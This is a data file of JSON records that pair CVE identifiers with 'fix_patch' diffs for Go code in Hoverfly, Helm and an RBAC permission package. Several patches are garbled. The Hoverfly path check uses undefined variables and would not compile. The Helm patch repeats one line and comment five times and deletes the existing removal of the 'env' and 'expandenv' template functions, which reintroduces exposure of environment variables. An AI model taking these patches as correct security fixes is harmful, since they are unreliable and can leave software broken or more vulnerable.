strings.HasPrefix(fileURL, allowedOrigin) {\n+                        isAllowed = true\n+                        break\n+                }\n+        }\n+\n+        if !isAllowed {\n+                return \"\", fmt.Errorf(\"bodyFile %s is not allowed. To allow this origin run hoverfly with -response-body-files-allow-origin\", fileURL)\n+        }\n+\n+        resp, err := http.DefaultClient.Get(fileURL)\n+        if err != nil {\n+                err := fmt.Errorf(\"bodyFile %s cannot be downloaded: %s\", fileURL, err.Error())\n+                return \"\", err\n+        }\n+\n+        content, err := util.GetResponseBody(resp)\n+        if err != nil {\n+                err := fmt.Errorf(\"response from bodyFile %s cannot be read: %s\", fileURL, err.Error())\n+                return \"\", err\n+        }\n+\n+        return content, nil\n }\n \n func (hf *Hoverfly) readResponseBodyFile(filePath string) (string, error) {\n-\tif filepath.IsAbs(filePath) {\n-\t\treturn \"\", fmt.Errorf(\"bodyFile contains absolute path (%s). only relative is supported\", filePath)\n-\t}\n+if filepath.IsAbs(filePath) {\n+return \"\", fmt.Errorf(\"bodyFile contains absolute path (%s). only relative is supported\", filePath)\n+}\n+\n+finalPath := filepath.Join(hf.Cfg.ResponsesBodyFilesPath, filePath)\n+\n+// ensure file path is located inside configured base path\n+absFinalPath, _ := filepath.Abs(finalPath)\n+basePath := filepath.Join(hf.Cfg.ResponsesBodyFilesPath, \"/\")\n+absBasePath, _ := filepath.Abs(basePath)\n \n-\tfileContents, err := ioutil.ReadFile(filepath.Join(hf.Cfg.ResponsesBodyFilesPath, filePath))\n-\tif err != nil {\n-\t\treturn \"\", err\n-\t}\n+if !strings.HasPrefix(tabsFinalPath, tabsBasePath) {\n+return \"\", fmt.Errorf(\"bodyFile cannot be located outside of %s\", hf.Cfg.ResponsesBodyFilesPath)\n+}\n+\n+fileContents, err := ioutil.ReadFile(finalPath)\n+if err != nil {\n+return \"\", err\n+}\n \n-\treturn string(fileContents[:]), nil\n+return string(fileContents[:]), nil\n }\n \n func (hf *Hoverfly) applyTransitionsStateTemplating(requestDetails *models.RequestDetails, response *models.ResponseDetails, cachedResponse *models.CachedResponse) (map[string]string, error) {\n-\tif response.TransitionsState == nil {\n-\t\treturn nil, nil\n-\t}\n-\n-\tvar stateTemplates map[string]*raymond.Template\n-\tif cachedResponse != nil && cachedResponse.ResponseStateTemplates != nil {\n-\t\tstateTemplates = cachedResponse.ResponseStateTemplates\n-\t} else {\n-\t\tstateTemplates = map[string]*raymond.Template{}\n-\t\tfor k, v := range response.TransitionsState {\n-\t\t\tstateTemplates[k], _ = hf.templator.ParseTemplate(v)\n-\t\t}\n-\n-\t\tif cachedResponse != nil {\n-\t\t\tcachedResponse.ResponseStateTemplates = stateTemplates\n-\t\t}\n-\t}\n-\n-\tvar err error\n-\tstate := make(map[string]string)\n-\n-\tfor k, v := range stateTemplates {\n-\t\tstate[k], err = hf.templator.RenderTemplate(v, requestDetails, response, hf.Simulation.Literals, hf.Simulation.Vars, hf.state.State, hf.Journal)\n-\t\tif err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\t}\n-\n-\treturn state, nil\n+        if response.TransitionsState == nil {\n+                return nil, nil\n+        }\n+\n+        var stateTemplates map[string]*raymond.Template\n+        if cachedResponse != nil && cachedResponse.ResponseStateTemplates != nil {\n+                stateTemplates = cachedResponse.ResponseStateTemplates\n+        } else {\n+                stateTemplates = map[string]*raymond.Template{}\n+                for k, v := range response.TransitionsState {\n+                        stateTemplates[k], _ = hf.templator.ParseTemplate(v)\n+                }\n+\n+                if cachedResponse != nil {\n+                        cachedResponse.ResponseStateTemplates = stateTemplates\n+                }\n+        }\n+\n+        var err error\n+        state := make(map[string]string)\n+\n+        for k, v := range stateTemplates {\n+                state[k], err = hf.templator.RenderTemplate(v, requestDetails, response, hf.Simulation.Literals, hf.Simulation.Vars, hf.state.State, hf.Journal)\n+                if err != nil {\n+                        return nil, err\n+                }\n+        }\n+\n+        return state, nil\n }\n \n func (hf *Hoverfly) applyBodyTemplating(requestDetails *models.RequestDetails, response *models.ResponseDetails, cachedResponse *models.CachedResponse) (string, error) {\n-\tvar template *raymond.Template\n-\tif cachedResponse != nil && cachedResponse.ResponseTemplate != nil {\n-\t\ttemplate = cachedResponse.ResponseTemplate\n-\t} else {\n-\t\t// Parse and cache the template\n-\t\ttemplate, _ = hf.templator.ParseTemplate(response.Body)\n-\t\tif cachedResponse != nil {\n-\t\t\tcachedResponse.ResponseTemplate = template\n-\t\t}\n-\t}\n-\n-\treturn hf.templator.RenderTemplate(template, requestDetails, response,  hf.Simulation.Literals, hf.Simulation.Vars, hf.state.State, hf.Journal)\n+        var template *raymond.Template\n+        if cachedResponse != nil && cachedResponse.ResponseTemplate != nil {\n+                template = cachedResponse.ResponseTemplate\n+        } else {\n+                // Parse and cache the template\n+                template, _ = hf.templator.ParseTemplate(response.Body)\n+                if cachedResponse != nil {\n+                        cachedResponse.ResponseTemplate = template\n+                }\n+        }\n+\n+        return hf.templator.RenderTemplate(template, requestDetails, response,  hf.Simulation.Literals, hf.Simulation.Vars, hf.state.State, hf.Journal)\n }\n \n func (hf *Hoverfly) applyHeadersTemplating(requestDetails *models.RequestDetails, response *models.ResponseDetails, cachedResponse *models.CachedResponse) (map[string][]string, error) {\n-\tvar headersTemplates map[string][]*raymond.Template\n-\tif cachedResponse != nil && cachedResponse.ResponseHeadersTemplates != nil {\n-\t\theadersTemplates = cachedResponse.ResponseHeadersTemplates\n-\t} else {\n-\t\tvar header []*raymond.Template\n-\t\theadersTemplates = map[string][]*raymond.Template{}\n-\t\t// Parse and cache headers templates\n-\t\tfor k, v := range response.Headers {\n-\t\t\theader = make([]*raymond.Template, len(v))\n-\t\t\tfor i, h := range v {\n-\t\t\t\theader[i], _ = hf.templator.ParseTemplate(h)\n-\t\t\t}\n-\n-\t\t\theadersTemplates[k] = header\n-\t\t}\n-\n-\t\tif cachedResponse != nil {\n-\t\t\tcachedResponse.ResponseHeadersTemplates = headersTemplates\n-\t\t}\n-\t}\n-\n-\tvar (\n-\t\theader []string\n-\t\terr    error\n-\t)\n-\theaders := map[string][]string{}\n-\n-\t// Render headers templates\n-\tfor k, v := range headersTemplates {\n-\t\theader = make([]string, len(v))\n-\t\tfor i, h := range v {\n-\t\t\theader[i], err = hf.templator.RenderTemplate(h, requestDetails, response, hf.Simulation.Literals, hf.Simulation.Vars, hf.state.State, hf.Journal)\n-\n-\t\t\tif err != nil {\n-\t\t\t\treturn nil, err\n-\t\t\t}\n-\t\t}\n-\t\theaders[k] = header\n-\t}\n-\n-\treturn headers, nil\n+        var headersTemplates map[string][]*raymond.Template\n+        if cachedResponse != nil && cachedResponse.ResponseHeadersTemplates != nil {\n+                headersTemplates = cachedResponse.ResponseHeadersTemplates\n+        } else {\n+                var header []*raymond.Template\n+                headersTemplates = map[string][]*raymond.Template{}\n+                // Parse and cache headers templates\n+                for k, v := range response.Headers {\n+                        header = make([]*raymond.Template, len(v))\n+                        for i, h := range v {\n+                                header[i], _ = hf.templator.ParseTemplate(h)\n+                        }\n+\n+                        headersTemplates[k] = header\n+                }\n+\n+                if cachedResponse != nil {\n+                        cachedResponse.ResponseHeadersTemplates = headersTemplates\n+                }\n+        }\n+\n+        var (\n+                header []string\n+                err    error\n+        )\n+        headers := map[string][]string{}\n+\n+        // Render headers templates\n+        for k, v := range headersTemplates {\n+                header = make([]string, len(v))\n+                for i, h := range v {\n+                        header[i], err = hf.templator.RenderTemplate(h, requestDetails, response, hf.Simulation.Literals, hf.Simulation.Vars, hf.state.State, hf.Journal)\n+\n+                        if err != nil {\n+                                return nil, err\n+                        }\n+                }\n+                headers[k] = header\n+        }\n+\n+        return headers, nil\n }\n \n // save gets request fingerprint, extracts request body, status code and headers, then saves it to cache\n func (hf *Hoverfly) Save(request *models.RequestDetails, response *models.ResponseDetails, modeArgs *modes.ModeArguments) error {\n-\tbody := []models.RequestFieldMatchers{\n-\t\t{\n-\t\t\tMatcher: matchers.Exact,\n-\t\t\tValue:   request.Body,\n-\t\t},\n-\t}\n-\tcontentType := util.GetContentTypeFromHeaders(request.Headers)\n-\tif contentType == \"json\" {\n-\t\tbody = []models.RequestFieldMatchers{\n-\t\t\t{\n-\t\t\t\tMatcher: matchers.Json,\n-\t\t\t\tValue:   request.Body,\n-\t\t\t},\n-\t\t}\n-\t} else if contentType == \"xml\" {\n-\t\tbody = []models.RequestFieldMatchers{\n-\t\t\t{\n-\t\t\t\tMatcher: matchers.Xml,\n-\t\t\t\tValue:   request.Body,\n-\t\t\t},\n-\t\t}\n-\t} else if contentType == \"form\" {\n-\t\tif len(request.FormData) > 0 {\n-\t\t\tform := make(map[string][]models.RequestFieldMatchers)\n-\t\t\tfor formKey, formValue := range request.FormData {\n-\t\t\t\tform[formKey] = []models.RequestFieldMatchers{\n-\t\t\t\t\t{\n-\t\t\t\t\t\tMatcher: matchers.Exact,\n-\t\t\t\t\t\tValue:   formValue[0],\n-\t\t\t\t\t},\n-\t\t\t\t}\n-\t\t\t}\n-\t\t\tbody = []models.RequestFieldMatchers{\n-\t\t\t\t{\n-\t\t\t\t\tMatcher: \"form\",\n-\t\t\t\t\tValue:   form,\n-\t\t\t\t},\n-\t\t\t}\n-\t\t}\n-\t}\n-\n-\tvar headers map[string][]string\n-\n-\tif len(modeArgs.Headers) >= 1 {\n-\t\tif modeArgs.Headers[0] == \"*\" {\n-\t\t\theaders = request.Headers\n-\t\t} else {\n-\t\t\theaders = map[string][]string{}\n-\t\t\tfor _, header := range modeArgs.Headers {\n-\t\t\t\theaderValues := request.Headers[header]\n-\t\t\t\tif len(headerValues) > 0 {\n-\t\t\t\t\theaders[header] = headerValues\n-\t\t\t\t}\n-\t\t\t}\n-\t\t}\n-\t}\n-\n-\tvar requestHeaders map[string][]models.RequestFieldMatchers\n-\tif len(headers) > 0 {\n-\t\trequestHeaders = map[string][]models.RequestFieldMatchers{}\n-\t\tfor key, values := range headers {\n-\t\t\trequestHeaders[key] = getRequestMatcherForMultipleValues(values)\n-\t\t}\n-\t}\n-\n-\tvar queries *models.QueryRequestFieldMatchers\n-\tif len(request.Query) > 0 {\n-\t\tqueries = &models.QueryRequestFieldMatchers{}\n-\t\tfor key, values := range request.Query {\n-\t\t\tqueries.Add(key, getRequestMatcherForMultipleValues(values))\n-\t\t}\n-\t}\n-\n-\tpair := models.RequestMatcherResponsePair{\n-\t\tRequestMatcher: models.RequestMatcher{\n-\t\t\tPath: []models.RequestFieldMatchers{\n-\t\t\t\t{\n-\t\t\t\t\tMatcher: matchers.Exact,\n-\t\t\t\t\tValue:   request.Path,\n-\t\t\t\t},\n-\t\t\t},\n-\t\t\tMethod: []models.RequestFieldMatchers{\n-\t\t\t\t{\n-\t\t\t\t\tMatcher: matchers.Exact,\n-\t\t\t\t\tValue:   request.Method,\n-\t\t\t\t},\n-\t\t\t},\n-\t\t\tDestination: []models.RequestFieldMatchers{\n-\t\t\t\t{\n-\t\t\t\t\tMatcher: matchers.Exact,\n-\t\t\t\t\tValue:   request.Destination,\n-\t\t\t\t},\n-\t\t\t},\n-\t\t\tScheme: []models.RequestFieldMatchers{\n-\t\t\t\t{\n-\t\t\t\t\tMatcher: matchers.Exact,\n-\t\t\t\t\tValue:   request.Scheme,\n-\t\t\t\t},\n-\t\t\t},\n-\t\t\tQuery:   queries,\n-\t\t\tBody:    body,\n-\t\t\tHeaders: requestHeaders,\n-\t\t},\n-\t\tResponse: *response,\n-\t}\n-\tif modeArgs.Stateful {\n-\t\thf.Simulation.AddPairInSequence(&pair, hf.state)\n-\t} else if modeArgs.OverwriteDuplicate {\n-\t\thf.Simulation.AddPairWithOverwritingDuplicate(&pair)\n-\t} else {\n-\t\thf.Simulation.AddPair(&pair)\n-\t}\n-\n-\tif hf.Cfg.GetMode() == modes.Spy {\n-\t\t_, _ = hf.CacheMatcher.SaveRequestMatcherResponsePair(*request, &pair, nil)\n-\t}\n-\n-\treturn nil\n+        body := []models.RequestFieldMatchers{\n+                {\n+                        Matcher: matchers.Exact,\n+                        Value:   request.Body,\n+                },\n+        }\n+        contentType := util.GetContentTypeFromHeaders(request.Headers)\n+        if contentType == \"json\" {\n+                body = []models.RequestFieldMatchers{\n+                        {\n+                                Matcher: matchers.Json,\n+                                Value:   request.Body,\n+                        },\n+                }\n+        } else if contentType == \"xml\" {\n+                body = []models.RequestFieldMatchers{\n+                        {\n+                                Matcher: matchers.Xml,\n+                                Value:   request.Body,\n+                        },\n+                }\n+        } else if contentType == \"form\" {\n+                if len(request.FormData) > 0 {\n+                        form := make(map[string][]models.RequestFieldMatchers)\n+                        for formKey, formValue := range request.FormData {\n+                                form[formKey] = []models.RequestFieldMatchers{\n+                                        {\n+                                                Matcher: matchers.Exact,\n+                                                Value:   formValue[0],\n+                                        },\n+                                }\n+                        }\n+                        body = []models.RequestFieldMatchers{\n+                                {\n+                                        Matcher: \"form\",\n+                                        Value:   form,\n+                                },\n+                        }\n+                }\n+        }\n+\n+        var headers map[string][]string\n+\n+        if len(modeArgs.Headers) >= 1 {\n+                if modeArgs.Headers[0] == \"*\" {\n+                        headers = request.Headers\n+                } else {\n+                        headers = map[string][]string{}\n+                        for _, header := range modeArgs.Headers {\n+                                headerValues := request.Headers[header]\n+                                if len(headerValues) > 0 {\n+                                        headers[header] = headerValues\n+                                }\n+                        }\n+                }\n+        }\n+\n+        var requestHeaders map[string][]models.RequestFieldMatchers\n+        if len(headers) > 0 {\n+                requestHeaders = map[string][]models.RequestFieldMatchers{}\n+                for key, values := range headers {\n+                        requestHeaders[key] = getRequestMatcherForMultipleValues(values)\n+                }\n+        }\n+\n+        var queries *models.QueryRequestFieldMatchers\n+        if len(request.Query) > 0 {\n+                queries = &models.QueryRequestFieldMatchers{}\n+                for key, values := range request.Query {\n+                        queries.Add(key, getRequestMatcherForMultipleValues(values))\n+                }\n+        }\n+\n+        pair := models.RequestMatcherResponsePair{\n+                RequestMatcher: models.RequestMatcher{\n+                        Path: []models.RequestFieldMatchers{\n+                                {\n+                                        Matcher: matchers.Exact,\n+                                        Value:   request.Path,\n+                                },\n+                        },\n+                        Method: []models.RequestFieldMatchers{\n+                                {\n+                                        Matcher: matchers.Exact,\n+                                        Value:   request.Method,\n+                                },\n+                        },\n+                        Destination: []models.RequestFieldMatchers{\n+                                {\n+                                        Matcher: matchers.Exact,\n+                                        Value:   request.Destination,\n+                                },\n+                        },\n+                        Scheme: []models.RequestFieldMatchers{\n+                                {\n+                                        Matcher: matchers.Exact,\n+                                        Value:   request.Scheme,\n+                                },\n+                        },\n+                        Query:   queries,\n+                        Body:    body,\n+                        Headers: requestHeaders,\n+                },\n+                Response: *response,\n+        }\n+        if modeArgs.Stateful {\n+                hf.Simulation.AddPairInSequence(&pair, hf.state)\n+        } else if modeArgs.OverwriteDuplicate {\n+                hf.Simulation.AddPairWithOverwritingDuplicate(&pair)\n+        } else {\n+                hf.Simulation.AddPair(&pair)\n+        }\n+\n+        if hf.Cfg.GetMode() == modes.Spy {\n+                _, _ = hf.CacheMatcher.SaveRequestMatcherResponsePair(*request, &pair, nil)\n+        }\n+\n+        return nil\n }\n \n func (hf *Hoverfly) ApplyMiddleware(pair models.RequestResponsePair) (models.RequestResponsePair, error) {\n-\tif hf.Cfg.Middleware.IsSet() {\n-\t\treturn hf.Cfg.Middleware.Execute(pair)\n-\t}\n+        if hf.Cfg.Middleware.IsSet() {\n+                return hf.Cfg.Middleware.Execute(pair)\n+        }\n \n-\treturn pair, nil\n+        return pair, nil\n }\n \n func getRequestMatcherForMultipleValues(values []string) []models.RequestFieldMatchers {\n-\tvar matcher string\n-\tvar value interface{}\n-\tif len(values) > 1 {\n-\t\tmatcher = matchers.Array\n-\t\tvalue = values\n-\t} else {\n-\t\tmatcher = matchers.Exact\n-\t\tvalue = strings.Join(values, \";\")\n-\t}\n-\treturn []models.RequestFieldMatchers{\n-\t\t{\n-\t\t\tMatcher: matcher,\n-\t\t\tValue:   value,\n-\t\t},\n-\t}\n+        var matcher string\n+        var value interface{}\n+        if len(values) > 1 {\n+                matcher = matchers.Array\n+                value = values\n+        } else {\n+                matcher = matchers.Exact\n+                value = strings.Join(values, \";\")\n+        }\n+        return []models.RequestFieldMatchers{\n+                {\n+                        Matcher: matcher,\n+                        Value:   value,\n+                },\n+        }\n }\n"}
{"cve":"CVE-2023-25165:0708", "fix_patch": "diff --git a/pkg/engine/funcs.go b/pkg/engine/funcs.go\nindex 92b4c3383..7a04e700e 100644\n--- a/pkg/engine/funcs.go\n+++ b/pkg/engine/funcs.go\n@@ -17,14 +17,14 @@ limitations under the License.\n package engine\n \n import (\n-\t\"bytes\"\n-\t\"encoding/json\"\n-\t\"strings\"\n-\t\"text/template\"\n-\n-\t\"github.com/BurntSushi/toml\"\n-\t\"github.com/Masterminds/sprig/v3\"\n-\t\"sigs.k8s.io/yaml\"\n+        \"bytes\"\n+        \"encoding/json\"\n+        \"strings\"\n+        \"text/template\"\n+\n+        \"github.com/BurntSushi/toml\"\n+        \"github.com/Masterminds/sprig/v3\"\n+        \"sigs.k8s.io/yaml\"\n )\n \n // funcMap returns a mapping of all of the functions that Engine has.\n@@ -35,45 +35,63 @@ import (\n //\n // Known late-bound functions:\n //\n-//\t- \"include\"\n-//\t- \"tpl\"\n+//      - \"include\"\n+//      - \"tpl\"\n //\n // These are late-bound in Engine.Render().  The\n // version included in the FuncMap is a placeholder.\n //\n func funcMap() template.FuncMap {\n-\tf := sprig.TxtFuncMap()\n-\tdelete(f, \"env\")\n-\tdelete(f, \"expandenv\")\n-\n-\t// Add some extra functionality\n-\textra := template.FuncMap{\n-\t\t\"toToml\":        toTOML,\n-\t\t\"toYaml\":        toYAML,\n-\t\t\"fromYaml\":      fromYAML,\n-\t\t\"fromYamlArray\": fromYAMLArray,\n-\t\t\"toJson\":        toJSON,\n-\t\t\"fromJson\":      fromJSON,\n-\t\t\"fromJsonArray\": fromJSONArray,\n-\n-\t\t// This is a placeholder for the \"include\" function, which is\n-\t\t// late-bound to a template. By declaring it here, we preserve the\n-\t\t// integrity of the linter.\n-\t\t\"include\":  func(string, interface{}) string { return \"not implemented\" },\n-\t\t\"tpl\":      func(string, interface{}) interface{} { return \"not implemented\" },\n-\t\t\"required\": func(string, interface{}) (interface{}, error) { return \"not implemented\", nil },\n-\t\t// Provide a placeholder for the \"lookup\" function, which requires a kubernetes\n-\t\t// connection.\n-\t\t\"lookup\": func(string, string, string, string) (map[string]interface{}, error) {\n-\t\t\treturn map[string]interface{}{}, nil\n-\t\t},\n-\t}\n-\n-\tfor k, v := range extra {\n-\t\tf[k] = v\n-\t}\n-\n-\treturn f\n+        f := sprig.TxtFuncMap()\n+        // getHostByName is deprecated and should be removed in Helm 4.\n+        // See https://github.com/helm/helm/issues/11963\n+\n+// getHostByName is deprecated and should be removed in Helm 4.\n+// See https://github.com/helm/helm/issues/11963\n+delete(f, \"getHostByName\")\n+        delete(f, \"getHostByName\")\n+\n+        // getHostByName is deprecated and should be removed in Helm 4.\n+        // See https://github.com/helm/helm/issues/11963\n+        delete(f, \"getHostByName\")\n+        // getHostByName is deprecated and should be removed in Helm 4.\n+        // See https://github.com/helm/helm/issues/11963\n+        delete(f, \"getHostByName\")\n+\n+        // getHostByName is deprecated and should be removed in Helm 4.\n+        // See https://github.com/helm/helm/issues/11963\n+        delete(f, \"getHostByName\")\n+\n+        // Add some extra functionality\n+\n+        // Add some extra functionality\n+        extra := template.FuncMap{\n+                \"toToml\":        toTOML,\n+                \"toYaml\":        toYAML,\n+                \"fromYaml\":      fromYAML,\n+                \"fromYamlArray\": fromYAMLArray,\n+                \"toJson\":        toJSON,\n+                \"fromJson\":      fromJSON,\n+                \"fromJsonArray\": fromJSONArray,\n+\n+                // This is a placeholder for the \"include\" function, which is\n+                // late-bound to a template. By declaring it here, we preserve the\n+                // integrity of the linter.\n+                \"include\":  func(string, interface{}) string { return \"not implemented\" },\n+                \"tpl\":      func(string, interface{}) interface{} { return \"not implemented\" },\n+                \"required\": func(string, interface{}) (interface{}, error) { return \"not implemented\", nil },\n+                // Provide a placeholder for the \"lookup\" function, which requires a kubernetes\n+                // connection.\n+                \"lookup\": func(string, string, string, string) (map[string]interface{}, error) {\n+                        return map[string]interface{}{}, nil\n+                },\n+        }\n+\n+        for k, v := range extra {\n+                f[k] = v\n+        }\n+\n+        return f\n }\n \n // toYAML takes an interface, marshals it to yaml, and returns a string. It will\n@@ -81,12 +99,12 @@ func funcMap() template.FuncMap {\n //\n // This is designed to be called from a template.\n func toYAML(v interface{}) string {\n-\tdata, err := yaml.Marshal(v)\n-\tif err != nil {\n-\t\t// Swallow errors inside of a template.\n-\t\treturn \"\"\n-\t}\n-\treturn strings.TrimSuffix(string(data), \"\\n\")\n+        data, err := yaml.Marshal(v)\n+        if err != nil {\n+                // Swallow errors inside of a template.\n+                return \"\"\n+        }\n+        return strings.TrimSuffix(string(data), \"\\n\")\n }\n \n // fromYAML converts a YAML document into a map[string]interface{}.\n@@ -96,12 +114,12 @@ func toYAML(v interface{}) string {\n // it tolerates errors. It will insert the returned error message string into\n // m[\"Error\"] in the returned map.\n func fromYAML(str string) map[string]interface{} {\n-\tm := map[string]interface{}{}\n+        m := map[string]interface{}{}\n \n-\tif err := yaml.Unmarshal([]byte(str), &m); err != nil {\n-\t\tm[\"Error\"] = err.Error()\n-\t}\n-\treturn m\n+        if err := yaml.Unmarshal([]byte(str), &m); err != nil {\n+                m[\"Error\"] = err.Error()\n+        }\n+        return m\n }\n \n // fromYAMLArray converts a YAML array into a []interface{}.\n@@ -111,12 +129,12 @@ func fromYAML(str string) map[string]interface{} {\n // it tolerates errors. It will insert the returned error message string as\n // the first and only item in the returned array.\n func fromYAMLArray(str string) []interface{} {\n-\ta := []interface{}{}\n+        a := []interface{}{}\n \n-\tif err := yaml.Unmarshal([]byte(str), &a); err != nil {\n-\t\ta = []interface{}{err.Error()}\n-\t}\n-\treturn a\n+        if err := yaml.Unmarshal([]byte(str), &a); err != nil {\n+                a = []interface{}{err.Error()}\n+        }\n+        return a\n }\n \n // toTOML takes an interface, marshals it to toml, and returns a string. It will\n@@ -124,13 +142,13 @@ func fromYAMLArray(str string) []interface{} {\n //\n // This is designed to be called from a template.\n func toTOML(v interface{}) string {\n-\tb := bytes.NewBuffer(nil)\n-\te := toml.NewEncoder(b)\n-\terr := e.Encode(v)\n-\tif err != nil {\n-\t\treturn err.Error()\n-\t}\n-\treturn b.String()\n+        b := bytes.NewBuffer(nil)\n+        e := toml.NewEncoder(b)\n+        err := e.Encode(v)\n+        if err != nil {\n+                return err.Error()\n+        }\n+        return b.String()\n }\n \n // toJSON takes an interface, marshals it to json, and returns a string. It will\n@@ -138,12 +156,12 @@ func toTOML(v interface{}) string {\n //\n // This is designed to be called from a template.\n func toJSON(v interface{}) string {\n-\tdata, err := json.Marshal(v)\n-\tif err != nil {\n-\t\t// Swallow errors inside of a template.\n-\t\treturn \"\"\n-\t}\n-\treturn string(data)\n+        data, err := json.Marshal(v)\n+        if err != nil {\n+                // Swallow errors inside of a template.\n+                return \"\"\n+        }\n+        return string(data)\n }\n \n // fromJSON converts a JSON document into a map[string]interface{}.\n@@ -153,12 +171,12 @@ func toJSON(v interface{}) string {\n // it tolerates errors. It will insert the returned error message string into\n // m[\"Error\"] in the returned map.\n func fromJSON(str string) map[string]interface{} {\n-\tm := make(map[string]interface{})\n+        m := make(map[string]interface{})\n \n-\tif err := json.Unmarshal([]byte(str), &m); err != nil {\n-\t\tm[\"Error\"] = err.Error()\n-\t}\n-\treturn m\n+        if err := json.Unmarshal([]byte(str), &m); err != nil {\n+                m[\"Error\"] = err.Error()\n+        }\n+        return m\n }\n \n // fromJSONArray converts a JSON array into a []interface{}.\n@@ -168,10 +186,10 @@ func fromJSON(str string) map[string]interface{} {\n // it tolerates errors. It will insert the returned error message string as\n // the first and only item in the returned array.\n func fromJSONArray(str string) []interface{} {\n-\ta := []interface{}{}\n+        a := []interface{}{}\n \n-\tif err := json.Unmarshal([]byte(str), &a); err != nil {\n-\t\ta = []interface{}{err.Error()}\n-\t}\n-\treturn a\n+        if err := json.Unmarshal([]byte(str), &a); err != nil {\n+                a = []interface{}{err.Error()}\n+        }\n+        return a\n }\n"}
{"cve":"CVE-2021-22538:0708", "fix_patch": "diff --git a/pkg/rbac/rbac.go b/pkg/rbac/rbac.go\nindex 18c433bd..4a759520 100644\n--- a/pkg/rbac/rbac.go\n+++ b/pkg/rbac/rbac.go\n@@ -16,99 +16,99 @@\n package rbac\n \n import (\n-\t\"database/sql/driver\"\n-\t\"fmt\"\n-\t\"sort\"\n+        \"database/sql/driver\"\n+        \"fmt\"\n+        \"sort\"\n )\n \n var (\n-\t// PermissionMap is the list of permissions mapped to their name and\n-\t// description.\n-\tPermissionMap = map[Permission][2]string{\n-\t\tAuditRead:      {\"AuditRead\", \"read event and audit logs\"},\n-\t\tAPIKeyRead:     {\"APIKeyRead\", \"view information about API keys, including statistics\"},\n-\t\tAPIKeyWrite:    {\"APIKeyWrite\", \"create, update, and delete API keys\"},\n-\t\tCodeIssue:      {\"CodeIssue\", \"issue codes\"},\n-\t\tCodeBulkIssue:  {\"CodeBulkIssue\", \"issue codes in bulk, if bulk issue is enabled on the realm\"},\n-\t\tCodeRead:       {\"CodeRead\", \"lookup code status\"},\n-\t\tCodeExpire:     {\"CodeExpire\", \"expire codes\"},\n-\t\tSettingsRead:   {\"SettingsRead\", \"read realm settings\"},\n-\t\tSettingsWrite:  {\"SettingsWrite\", \"update realm settings\"},\n-\t\tStatsRead:      {\"StatsRead\", \"view realm statistics\"},\n-\t\tMobileAppRead:  {\"MobileAppRead\", \"view mobile app information\"},\n-\t\tMobileAppWrite: {\"MobileAppWrite\", \"create, update, and delete mobile apps\"},\n-\t\tUserRead:       {\"UserRead\", \"view user information\"},\n-\t\tUserWrite:      {\"UserWrite\", \"create, update, and delete users\"},\n-\t}\n-\n-\t// NamePermissionMap is the map of permission names to their value.\n-\tNamePermissionMap map[string]Permission\n+        // PermissionMap is the list of permissions mapped to their name and\n+        // description.\n+        PermissionMap = map[Permission][2]string{\n+                AuditRead:      {\"AuditRead\", \"read event and audit logs\"},\n+                APIKeyRead:     {\"APIKeyRead\", \"view information about API keys, including statistics\"},\n+                APIKeyWrite:    {\"APIKeyWrite\", \"create, update, and delete API keys\"},\n+                CodeIssue:      {\"CodeIssue\", \"issue codes\"},\n+                CodeBulkIssue:  {\"CodeBulkIssue\", \"issue codes in bulk, if bulk issue is enabled on the realm\"},\n+                CodeRead:       {\"CodeRead\", \"lookup code status\"},\n+                CodeExpire:     {\"CodeExpire\", \"expire codes\"},\n+                SettingsRead:   {\"SettingsRead\", \"read realm settings\"},\n+                SettingsWrite:  {\"SettingsWrite\", \"update realm settings\"},\n+                StatsRead:      {\"StatsRead\", \"view realm statistics\"},\n+                MobileAppRead:  {\"MobileAppRead\", \"view mobile app information\"},\n+                MobileAppWrite: {\"MobileAppWrite\", \"create, update, and delete mobile apps\"},\n+                UserRead:       {\"UserRead\", \"view user information\"},\n+                UserWrite:      {\"UserWrite\", \"create, update, and delete users\"},\n+        }\n+\n+        // NamePermissionMap is the map of permission names to their value.\n+        NamePermissionMap map[string]Permission\n )\n \n func init() {\n-\tNamePermissionMap = make(map[string]Permission, len(PermissionMap))\n-\tfor k, v := range PermissionMap {\n-\t\tNamePermissionMap[v[0]] = k\n-\t}\n+        NamePermissionMap = make(map[string]Permission, len(PermissionMap))\n+        for k, v := range PermissionMap {\n+                NamePermissionMap[v[0]] = k\n+        }\n }\n \n // Can returns true if the given resource has permission to perform the provided\n // permissions.\n func Can(given Permission, target Permission) bool {\n-\treturn int64(given)&int64(target) != 0\n+        return int64(given)&int64(target) != 0\n }\n \n // CompileAndAuthorize compiles a new permission bit from the given toUpdate\n // permissions. It verifies that the calling permission has a superset of all\n // provided permissions (to prevent privilege escalation).\n func CompileAndAuthorize(actorPermission Permission, toUpdate []Permission) (Permission, error) {\n-\tvar permission Permission\n-\tfor _, update := range toUpdate {\n-\t\t// Verify that the user making changes has the permissions they are trying\n-\t\t// to grant. It is not valid for someone to grant permissions larger than\n-\t\t// they currently have.\n-\t\tif !Can(actorPermission, update) {\n-\t\t\treturn 0, fmt.Errorf(\"actor does not have all scopes which are being granted\")\n-\t\t}\n-\t\tpermission = permission | update\n-\t}\n-\n-\t// Ensure implied permissions. The actor must also have the implied\n-\t// permissions by definition.\n-\tpermission = AddImplied(permission)\n-\treturn permission, nil\n+        var permission Permission\n+        for _, update := range toUpdate {\n+                // Verify that the user making changes has the permissions they are trying\n+                // to grant. It is not valid for someone to grant permissions larger than\n+                // they currently have.\n+                if (actorPermission & update) != update {\n+                        return 0, fmt.Errorf(\"actor does not have all scopes which are being granted\")\n+                }\n+                permission = permission | update\n+        }\n+\n+        // Ensure implied permissions. The actor must also have the implied\n+        // permissions by definition.\n+        permission = AddImplied(permission)\n+        return permission, nil\n }\n \n // AddImplied adds any missing implied permissions.\n func AddImplied(target Permission) Permission {\n-\tfor has, needs := range requiredPermission {\n-\t\t// If granted has, ensure that we have all needs.\n-\t\tif Can(target, has) {\n-\t\t\tfor _, required := range needs {\n-\t\t\t\ttarget = target | required\n-\t\t\t}\n-\t\t}\n-\t}\n-\treturn target\n+        for has, needs := range requiredPermission {\n+                // If granted has, ensure that we have all needs.\n+                if Can(target, has) {\n+                        for _, required := range needs {\n+                                target = target | required\n+                        }\n+                }\n+        }\n+        return target\n }\n \n // ImpliedBy returns any permissions that cause this permission to be added\n // automatically. The return may be nil.\n func ImpliedBy(permission Permission) []Permission {\n-\treturn impliedBy[permission]\n+        return impliedBy[permission]\n }\n \n // PermissionNames returns the list of permissions included in the given\n // permission.\n func PermissionNames(p Permission) []string {\n-\tnames := make([]string, 0, len(PermissionMap))\n-\tfor v, k := 